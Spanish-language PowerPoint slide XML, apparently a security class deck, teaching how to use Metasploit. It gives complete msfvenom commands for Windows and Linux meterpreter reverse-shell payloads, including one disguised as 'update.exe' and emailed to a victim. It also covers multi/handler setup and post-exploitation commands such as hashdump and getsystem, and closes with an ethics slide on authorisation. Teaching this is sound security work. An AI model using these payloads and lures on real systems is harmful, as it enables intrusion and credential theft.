          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1341884" y="2060848"/>
            <a:ext cx="81123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Parámetros Clave de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>-p: El tipo de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> (Ej. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>). LHOST / LPORT: Tu IP y puerto de escucha. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>-f: Formato del archivo de salida (Ej. exe, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>elf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>aspx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>nombre_archivo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>: Guarda la salida en un archivo.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3536C25-B95D-5B09-DB8E-642056F98042}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="765820" y="4653136"/>
            <a:ext cx="11377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800" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> -p </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t>/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> LHOST=192.168.1.10 LPORT=4444 -f exe &gt; payload_win.exe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351773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52FE4C4-C6D3-790C-D64F-2ABAA16F14AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2782044" y="332656"/>
            <a:ext cx="6112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multi/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>: El Oyente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04AA2A-1C6F-F827-4836-6E82C296F2B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837828" y="908720"/>
            <a:ext cx="110172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El módulo multi/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> es esencial para el ataque de Ingeniería Social. Es un módulo auxiliar cuya única función es esperar a que el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> creado con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> se conecte a él.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A711285-67A2-1AAA-0D25-D0E217FA57C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1989956" y="2348880"/>
            <a:ext cx="77768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¿Por qué lo necesitamos? La mayoría de los firewalls permiten conexiones salientes. El reverse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> hace que la máquina víctima se conecte a ti, evadiendo el firewall. El multi/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> es el puerto de escucha que te permite capturar esa conexión.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8A6137-2B03-0652-3954-CF9C5ECE1D85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="981844" y="4284176"/>
            <a:ext cx="99371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Configuración</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>El </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> y </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LPORT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>multi/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" i="1" dirty="0"/>
              <a:t>deben coincidir exactamente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> con los parámetros usados en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>msfvenom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906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F22E967-23A6-B556-65EA-2D9FF82F9DBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2998068" y="332656"/>
            <a:ext cx="6112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Ingeniería Social en Windows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AEF9446-12AF-56CA-58E2-8F6F0A30E91A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="980728"/>
            <a:ext cx="9289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Engañar a un usuario para que ejecute nuestro </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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58BE8E9-C359-F4B2-7DB9-F7F7F672E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444507"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1197868" y="1691561"/>
          <a:ext cx="10297143" cy="4463280"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3432381">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1391619290"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3432381">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="82191683"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3432381">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2684258941"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="375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Paso</a:t>
                      </a:r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Acción</a:t>
                      </a:r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Comando Metasploit / Terminal</a:t>
                      </a:r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681297"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="120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/>
                        <a:t>1. Crear el Payload</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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Generar el ejecutable (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>.exe</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100"/>
                        <a:t>) con la IP del atacante.</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe &gt; update.exe</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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048550"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="542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/>
                        <a:t>2. Cargar el Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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Iniciar Metasploit y cargar el oyente.</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>use exploit/multi/handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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78887"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="708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/>
                        <a:t>3. Configurar Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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/>
                        <a:t>COINCIDENCIA EXACTA:</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100"/>
                        <a:t> Payload, LHOST y LPORT.</a:t>
                      </a:r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set payload windows/x64/meterpreter/reverse_tcp</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100"/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954736"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="542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/>
                        <a:t>4. Configurar Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LHOST 192.168.1.10</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="da-DK" sz="1100"/>
                        <a:t> / </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="da-DK" sz="1100">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LPORT 4444</a:t>
                      </a:r>
                      <a:endParaRPr lang="da-DK" sz="1100"/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s-CL" sz="1100"/>
                      </a:br>
                      <a:endParaRPr lang="es-CL" sz="1100"/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029192"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="208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/>
                        <a:t>5. Escuchar</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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Iniciar la escucha.</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>run</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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381919"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="875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/>
                        <a:t>6. Explotación</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1100"/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/>
                        <a:t>El atacante envía </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>update.exe</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100"/>
                        <a:t> por correo y el usuario lo abre. El </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>handler</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1100"/>
                        <a:t> atrapa la sesión.</a:t>
                      </a:r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100" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="41705" marR="41705" marT="20853" marB="208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268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17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A2047A0-2611-7A0C-56F4-D1A138908B01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3286100" y="260648"/>
            <a:ext cx="6112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Ingeniería Social en Linux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F81A48-19EB-B1FE-21CF-ED684004AB6A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1989956" y="836712"/>
            <a:ext cx="6112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Obtener una </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> al ejecutar un script en Linux.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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F9F53D3-093C-99B8-72A8-6C93D5496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049574"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1269876" y="1484784"/>
          <a:ext cx="10225137" cy="4462463"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3408379">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1507945337"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3408379">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2410188164"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3408379">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1186239835"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="489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/>
                        <a:t>Paso</a:t>
                      </a:r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/>
                        <a:t>Acción</a:t>
                      </a:r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/>
                        <a:t>Comando Metasploit / Terminal</a:t>
                      </a:r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468178"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="157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1. Crear el Payload</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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/>
                        <a:t>Generar un payload Linux (formato ELF).</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf &gt; script_linux</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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70869"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="707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2. Cargar el Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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/>
                        <a:t>Iniciar Metasploit y cargar el oyente.</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>use exploit/multi/handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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22058"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="707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3. Configurar Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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b="1"/>
                        <a:t>COINCIDENCIA EXACTA</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400"/>
                        <a:t> con el payload anterior.</a:t>
                      </a:r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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set payload linux/x86/meterpreter/reverse_tcp</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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61759"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="707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4. Configurar Handler</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LHOST 192.168.1.10</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="da-DK" sz="1400"/>
                        <a:t> / </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="da-DK" sz="1400">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LPORT 4444</a:t>
                      </a:r>
                      <a:endParaRPr lang="da-DK" sz="1400"/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s-CL" sz="1400"/>
                      </a:br>
                      <a:endParaRPr lang="es-CL" sz="1400"/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09948"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="272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5. Escuchar</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/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/>
                        <a:t>Iniciar la escucha.</a:t>
                      </a:r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dirty="0">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>run</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54420" marR="54420" marT="27210" marB="27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908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44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D923199-DBC8-D063-8596-70933972F63E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3430116" y="332656"/>
            <a:ext cx="6112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Post-Explotación y Ética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3BBD689-A9F7-CB4C-850C-0CE16C086FF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="908720"/>
            <a:ext cx="1116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Una vez que se obtiene la sesión (ej. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>), se inicia la fase de Post-Explotación.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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5F1774A-BC56-0A90-E21A-41D891E4170C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829911"/>
          <a:ext cx="10360024" cy="4206240"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5180012">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3915154722"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5180012">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="242078644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/>
                        <a:t>Comando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/>
                        <a:t>Función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298989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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>sysinfo</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL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/>
                        <a:t>Muestra el sistema operativo, arquitectura,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63893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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>shell</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL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/>
                        <a:t>Cambia a una shell de comandos nativa (CMD o Bash).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7315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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>upload</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="2400" b="1"/>
                        <a:t> / </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="2400" b="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>download</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL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400"/>
                        <a:t>Sube o baja archivos de la víctima.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91887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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>getsystem</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL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Intenta escalar privilegios a </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pt-BR" sz="2400">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>SYSTEM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pt-BR" sz="2400"/>
                        <a:t> (en Windows) o </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pt-BR" sz="2400">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>root</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pt-BR" sz="240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94463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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>hashdump</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL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400" dirty="0"/>
                        <a:t>Extrae los hashes de las contraseñas del sistema.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775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97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BFF7EC0-5A71-7124-465C-D25606B29EFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3022600" y="2276531"/>
            <a:ext cx="61129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Límite Ético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Autorización:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> La explotación es legal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>solo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> con permiso explícito del propietario del sistema.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Alcance:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> Nunca exceder el alcance acordado.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Limpieza:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> Borrar toda evidencia de la actividad y restaurar el sistema al finalizar la prueba.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="327428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C5C8524-00A5-6737-C21A-41733C7F8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572" y="0"/>
            <a:ext cx="7141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84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í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60_TF02787990_TF02787990.potx" id="{711CCDD4-BD90-4388-A31E-EA977055FCFF}" vid="{C5F9FE6A-8390-4E5A-B0DB-91EA047CC61C}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2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triple circuito (panorámica)</Template>
  <TotalTime>74</TotalTime>
  <Words>1138</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Personalizado</PresentationFormat>
  <Paragraphs>148</Paragraphs>
  <Slides>13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Tecnología 16x9</vt:lpstr>
      <vt:lpstr>Metasploit</vt:lpstr>
      <vt:lpstr>Título y diseño de contenido con lista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Ignacio Carrasco Zura</dc:creator>
  <cp:lastModifiedBy>Patricio Ignacio Carrasco Zura</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-09-29T02:49:01Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-29T04:03:54Z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